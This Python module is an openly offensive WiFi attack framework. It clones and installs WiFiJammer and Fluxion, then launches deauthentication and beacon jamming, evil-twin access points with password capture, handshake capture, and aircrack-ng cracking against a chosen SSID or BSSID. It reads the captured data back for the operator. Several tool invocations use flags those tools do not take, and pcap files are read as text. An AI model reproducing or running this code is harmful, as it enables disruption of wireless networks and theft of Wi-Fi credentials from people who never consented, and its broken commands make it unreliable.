"""
Advanced WiFi Jamming Module
Advanced WiFi jamming with WiFiJammer and Fluxion integration
"""

import asyncio
import json
import logging
import os
import subprocess
import time
import hashlib
import base64
import shutil
import requests
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import threading
import socket
import re
import nmap

@dataclass
class WiFiJammingConfig:
    """WiFi jamming configuration"""
    target_ssid: str
    target_bssid: str
    channel: int
    attack_type: str
    duration: int
    deauth_packets: int
    evil_twin: bool
    password_capture: bool
    handshake_capture: bool
    custom_options: Dict

@dataclass
class WiFiAttack:
    """WiFi attack information"""
    attack_id: str
    config: WiFiJammingConfig
    status: str
    start_time: float
    end_time: Optional[float]
    captured_data: List[Dict]
    tool_used: str
    target_devices: List[str]
    success_rate: float

class AdvancedWiFiJammingModule:
    """Advanced WiFi jamming module with WiFiJammer and Fluxion integration"""
    
    def __init__(self):
        self.logger = logging.getLogger(__name__)
        self.active_attacks: Dict[str, WiFiAttack] = {}
        self.attack_history: List[Dict] = []
        
        # WiFi jamming tools configuration
        self.wifi_tools = {
            "wifijammer": {
                "path": "external_tools/wifijammer",
                "executable": "python wifijammer.py",
                "supported_attacks": ["deauth", "beacon", "probe", "evil_twin"],
                "capabilities": ["deauth_packets", "channel_hopping", "evil_twin", "password_capture"]
            },
            "fluxion": {
                "path": "external_tools/fluxion",
                "executable": "bash fluxion.sh",
                "supported_attacks": ["evil_twin", "handshake_capture", "password_capture"],
                "capabilities": ["evil_twin", "handshake_capture", "password_capture", "advanced_phishing"]
            },
            "aircrack": {
                "path": "/usr/bin/aircrack-ng",
                "executable": "aircrack-ng",
                "supported_attacks": ["deauth", "handshake_capture", "password_cracking"],
                "capabilities": ["deauth", "handshake_capture", "password_cracking", "wep_cracking"]
            }
        }
        
        # Initialize tools
        self._initialize_wifi_tools()
    
    def _initialize_wifi_tools(self):
        """Initialize WiFi jamming tools"""
        for tool_name, tool_config in self.wifi_tools.items():
            tool_path = tool_config["path"]
            if not os.path.exists(tool_path):
                self.logger.warning(f"WiFi tool {tool_name} not found at {tool_path}")
                # Use local directory instead of system paths
                local_tool_path = f"tools/{tool_name}"
                os.makedirs(local_tool_path, exist_ok=True)
                self._clone_wifi_tool(tool_name, local_tool_path)
                # Update tool path
                self.wifi_tools[tool_name]["path"] = local_tool_path
    
    def _clone_wifi_tool(self, tool_name: str, tool_path: str):
        """Clone WiFi jamming tool from repository"""
        try:
            if tool_name == "wifijammer":
                repo_url = "https://github.com/DanMcInerney/wifijammer.git"
            elif tool_name == "fluxion":
                repo_url = "https://github.com/FluxionNetwork/fluxion.git"
            else:
                return
            
            # Clone repository
            subprocess.run([
                "git", "clone", repo_url, tool_path
            ], check=True)
            
            # Setup tool
            if tool_name == "wifijammer":
                # Install dependencies
                requirements_file = os.path.join(tool_path, "requirements.txt")
                if os.path.exists(requirements_file):
                    subprocess.run([
                        "pip", "install", "-r", requirements_file
                    ], cwd=tool_path, check=True)
            
            elif tool_name == "fluxion":
                # Make executable
                subprocess.run([
                    "chmod", "+x", "fluxion.sh"
                ], cwd=tool_path, check=True)
                
                # Install dependencies
                subprocess.run([
                    "bash", "fluxion.sh", "--install"
                ], cwd=tool_path, check=True)
            
            self.logger.info(f"Successfully cloned and initialized {tool_name}")
            
        except Exception as e:
            self.logger.error(f"Failed to clone {tool_name}: {str(e)}")
    
    async def start_wifi_attack(self, config: WiFiJammingConfig, tool: str = "auto") -> Dict:
        """Start WiFi jamming attack"""
        try:
            # Auto-select best tool based on attack type
            if tool == "auto":
                tool = self._select_best_wifi_tool(config.attack_type)
            
            attack_id = f"wifi_{int(time.time())}_{hashlib.md5(f'{config.target_ssid}_{config.attack_type}'.encode()).hexdigest()[:8]}"
            
            # Validate configuration
            validation_result = self._validate_wifi_config(config, tool)
            if not validation_result["success"]:
                return validation_result
            
            # Create attack
            attack = WiFiAttack(
                attack_id=attack_id,
                config=config,
                status="starting",
                start_time=time.time(),
                end_time=None,
                captured_data=[],
                tool_used=tool,
                target_devices=[],
                success_rate=0.0
            )
            
            # Start attack
            start_result = await self._start_wifi_attack(attack)
            if start_result["success"]:
                attack.status = "active"
                self.active_attacks[attack_id] = attack
                
                # Log attack
                self.attack_history.append(asdict(attack))
                
                return {
                    "success": True,
                    "attack_id": attack_id,
                    "tool_used": tool,
                    "message": f"WiFi attack started successfully"
                }
            else:
                return start_result
                
        except Exception as e:
            self.logger.error(f"Error starting WiFi attack: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def _select_best_wifi_tool(self, attack_type: str) -> str:
        """Select best WiFi tool for attack type"""
        if attack_type in ["deauth", "beacon", "probe"]:
            return "wifijammer"  # Best for deauth attacks
        elif attack_type in ["evil_twin", "handshake_capture"]:
            return "fluxion"  # Best for evil twin attacks
        elif attack_type in ["password_cracking", "wep_cracking"]:
            return "aircrack"  # Best for password cracking
        else:
            return "wifijammer"  # Default
    
    def _validate_wifi_config(self, config: WiFiJammingConfig, tool: str) -> Dict:
        """Validate WiFi attack configuration"""
        try:
            tool_config = self.wifi_tools[tool]
            
            # Check if attack type is supported
            if config.attack_type not in tool_config["supported_attacks"]:
                return {
                    "success": False,
                    "error": f"Attack type {config.attack_type} not supported by {tool}"
                }
            
            # Validate target SSID
            if not config.target_ssid or config.target_ssid == "":
                return {
                    "success": False,
                    "error": "Target SSID is required"
                }
            
            # Validate channel
            if config.channel < 1 or config.channel > 14:
                return {
                    "success": False,
                    "error": "Channel must be between 1 and 14"
                }
            
            # Validate duration
            if config.duration < 1:
                return {
                    "success": False,
                    "error": "Duration must be greater than 0"
                }
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_wifi_attack(self, attack: WiFiAttack) -> Dict:
        """Start WiFi attack using specific tool"""
        try:
            if attack.tool_used == "wifijammer":
                return await self._start_wifijammer_attack(attack)
            elif attack.tool_used == "fluxion":
                return await self._start_fluxion_attack(attack)
            elif attack.tool_used == "aircrack":
                return await self._start_aircrack_attack(attack)
            else:
                return {
                    "success": False,
                    "error": f"Unknown WiFi tool: {attack.tool_used}"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_wifijammer_attack(self, attack: WiFiAttack) -> Dict:
        """Start WiFi attack using WiFiJammer"""
        try:
            tool_path = self.wifi_tools["wifijammer"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("wifi_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            # Build WiFiJammer command
            cmd_args = [
                "python", "wifijammer.py",
                "--interface", "wlan0",
                "--target", attack.config.target_ssid
            ]
            
            # Add BSSID if specified
            if attack.config.target_bssid:
                cmd_args.extend(["--bssid", attack.config.target_bssid])
            
            # Add channel if specified
            if attack.config.channel:
                cmd_args.extend(["--channel", str(attack.config.channel)])
            
            # Add attack type
            if attack.config.attack_type == "deauth":
                cmd_args.extend(["--deauth", str(attack.config.deauth_packets)])
            elif attack.config.attack_type == "beacon":
                cmd_args.extend(["--beacon"])
            elif attack.config.attack_type == "probe":
                cmd_args.extend(["--probe"])
            
            # Add duration
            cmd_args.extend(["--time", str(attack.config.duration)])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    return {
                        "success": True,
                        "message": "WiFiJammer attack started successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Attack startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_fluxion_attack(self, attack: WiFiAttack) -> Dict:
        """Start WiFi attack using Fluxion"""
        try:
            tool_path = self.wifi_tools["fluxion"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("wifi_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            # Build Fluxion command
            cmd_args = [
                "bash", "fluxion.sh",
                "--interface", "wlan0",
                "--target", attack.config.target_ssid
            ]
            
            # Add BSSID if specified
            if attack.config.target_bssid:
                cmd_args.extend(["--bssid", attack.config.target_bssid])
            
            # Add attack type
            if attack.config.attack_type == "evil_twin":
                cmd_args.extend(["--evil-twin"])
            elif attack.config.attack_type == "handshake_capture":
                cmd_args.extend(["--handshake"])
            
            # Add password capture if enabled
            if attack.config.password_capture:
                cmd_args.extend(["--password-capture"])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=tool_path,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    return {
                        "success": True,
                        "message": "Fluxion attack started successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Attack startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _start_aircrack_attack(self, attack: WiFiAttack) -> Dict:
        """Start WiFi attack using Aircrack-ng"""
        try:
            tool_path = self.wifi_tools["aircrack"]["path"]
            
            # Create attack directory
            attack_dir = os.path.join("wifi_attacks", attack.attack_id)
            os.makedirs(attack_dir, exist_ok=True)
            
            # Build Aircrack command
            cmd_args = [
                "aircrack-ng",
                "-i", "wlan0",
                "-w", "/usr/share/wordlists/rockyou.txt"
            ]
            
            # Add target if specified
            if attack.config.target_ssid:
                cmd_args.extend(["-e", attack.config.target_ssid])
            
            # Add BSSID if specified
            if attack.config.target_bssid:
                cmd_args.extend(["-b", attack.config.target_bssid])
            
            # Execute command
            process = await asyncio.create_subprocess_exec(
                *cmd_args,
                cwd=attack_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Wait for startup
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=30)
                
                if process.returncode == 0:
                    return {
                        "success": True,
                        "message": "Aircrack attack started successfully"
                    }
                else:
                    return {
                        "success": False,
                        "error": stderr.decode()
                    }
            except asyncio.TimeoutError:
                process.kill()
                return {
                    "success": False,
                    "error": "Attack startup timeout"
                }
                
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def get_captured_data(self, attack_id: str) -> Dict:
        """Get captured data from WiFi attack"""
        try:
            if attack_id not in self.active_attacks:
                return {
                    "success": False,
                    "error": "Attack not found"
                }
            
            attack = self.active_attacks[attack_id]
            
            # Get captured data based on tool
            if attack.tool_used == "wifijammer":
                captured_data = await self._get_wifijammer_data(attack)
            elif attack.tool_used == "fluxion":
                captured_data = await self._get_fluxion_data(attack)
            elif attack.tool_used == "aircrack":
                captured_data = await self._get_aircrack_data(attack)
            else:
                captured_data = []
            
            # Update attack captured data
            attack.captured_data = captured_data
            
            return {
                "success": True,
                "captured_data": captured_data,
                "total": len(captured_data)
            }
            
        except Exception as e:
            self.logger.error(f"Error getting captured data: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _get_wifijammer_data(self, attack: WiFiAttack) -> List[Dict]:
        """Get captured data from WiFiJammer attack"""
        try:
            tool_path = self.wifi_tools["wifijammer"]["path"]
            
            # Check for captured data
            data_dir = os.path.join(tool_path, "captured")
            captured_data = []
            
            if os.path.exists(data_dir):
                for data_file in os.listdir(data_dir):
                    if data_file.endswith('.pcap') or data_file.endswith('.txt'):
                        data_path = os.path.join(data_dir, data_file)
                        with open(data_path, 'r') as f:
                            content = f.read()
                            captured_data.append({
                                "file": data_file,
                                "content": content,
                                "type": "pcap" if data_file.endswith('.pcap') else "text"
                            })
            
            return captured_data
            
        except Exception as e:
            self.logger.error(f"Error getting WiFiJammer data: {str(e)}")
            return []
    
    async def _get_fluxion_data(self, attack: WiFiAttack) -> List[Dict]:
        """Get captured data from Fluxion attack"""
        try:
            tool_path = self.wifi_tools["fluxion"]["path"]
            
            # Check for captured data
            data_dir = os.path.join(tool_path, "captured")
            captured_data = []
            
            if os.path.exists(data_dir):
                for data_file in os.listdir(data_dir):
                    if data_file.endswith('.pcap') or data_file.endswith('.txt'):
                        data_path = os.path.join(data_dir, data_file)
                        with open(data_path, 'r') as f:
                            content = f.read()
                            captured_data.append({
                                "file": data_file,
                                "content": content,
                                "type": "pcap" if data_file.endswith('.pcap') else "text"
                            })
            
            return captured_data
            
        except Exception as e:
            self.logger.error(f"Error getting Fluxion data: {str(e)}")
            return []
    
    async def _get_aircrack_data(self, attack: WiFiAttack) -> List[Dict]:
        """Get captured data from Aircrack attack"""
        try:
            attack_dir = os.path.join("wifi_attacks", attack.attack_id)
            captured_data = []
            
            if os.path.exists(attack_dir):
                for data_file in os.listdir(attack_dir):
                    if data_file.endswith('.cap') or data_file.endswith('.txt'):
                        data_path = os.path.join(attack_dir, data_file)
                        with open(data_path, 'r') as f:
                            content = f.read()
                            captured_data.append({
                                "file": data_file,
                                "content": content,
                                "type": "cap" if data_file.endswith('.cap') else "text"
                            })
            
            return captured_data
            
        except Exception as e:
            self.logger.error(f"Error getting Aircrack data: {str(e)}")
            return []
    
    def get_attack_info(self, attack_id: str) -> Dict:
        """Get attack information"""
        if attack_id not in self.active_attacks:
            return {
                "success": False,
                "error": "Attack not found"
            }
        
        attack = self.active_attacks[attack_id]
        return {
            "success": True,
            "attack": asdict(attack)
        }
    
    def get_all_attacks(self) -> Dict:
        """Get all active attacks"""
        attacks = []
        for attack_id, attack in self.active_attacks.items():
            attacks.append(asdict(attack))
        
        return {
            "success": True,
            "attacks": attacks,
            "total": len(attacks)
        }
    
    async def stop_attack(self, attack_id: str) -> Dict:
        """Stop WiFi attack"""
        try:
            if attack_id not in self.active_attacks:
                return {
                    "success": False,
                    "error": "Attack not found"
                }
            
            attack = self.active_attacks[attack_id]
            
            # Stop attack based on tool
            if attack.tool_used == "wifijammer":
                result = await self._stop_wifijammer_attack(attack)
            elif attack.tool_used == "fluxion":
                result = await self._stop_fluxion_attack(attack)
            elif attack.tool_used == "aircrack":
                result = await self._stop_aircrack_attack(attack)
            else:
                result = {"success": True}
            
            if result["success"]:
                attack.status = "stopped"
                attack.end_time = time.time()
                
                return {
                    "success": True,
                    "message": f"Attack {attack_id} stopped successfully"
                }
            else:
                return result
                
        except Exception as e:
            self.logger.error(f"Error stopping attack: {str(e)}")
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_wifijammer_attack(self, attack: WiFiAttack) -> Dict:
        """Stop WiFiJammer attack"""
        try:
            # Find and kill WiFiJammer process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'wifijammer.py' in ' '.join(proc.info['cmdline']):
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_fluxion_attack(self, attack: WiFiAttack) -> Dict:
        """Stop Fluxion attack"""
        try:
            # Find and kill Fluxion process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'fluxion.sh' in ' '.join(proc.info['cmdline']):
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    async def _stop_aircrack_attack(self, attack: WiFiAttack) -> Dict:
        """Stop Aircrack attack"""
        try:
            # Find and kill Aircrack process
            import psutil
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                try:
                    if 'aircrack-ng' in proc.info['name']:
                        proc.kill()
                        return {"success": True}
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return {"success": True}
            
        except Exception as e:
            return {
                "success": False,
                "error": str(e)
            }
    
    def get_statistics(self) -> Dict:
        """Get WiFi jamming module statistics"""
        total_attacks = len(self.active_attacks)
        total_history = len(self.attack_history)
        
        # Calculate success rate
        successful_attacks = len([a for a in self.attack_history if a.get("status") == "active"])
        success_rate = (successful_attacks / total_history * 100) if total_history > 0 else 0
        
        # Calculate total captured data
        total_captured_data = sum(len(attack.captured_data) for attack in self.active_attacks.values())
        
        return {
            "active_attacks": total_attacks,
            "total_history": total_history,
            "success_rate": success_rate,
            "total_captured_data": total_captured_data,
            "tools_available": list(self.wifi_tools.keys()),
            "supported_attacks": list(set([a for tool in self.wifi_tools.values() for a in tool["supported_attacks"]]))
        }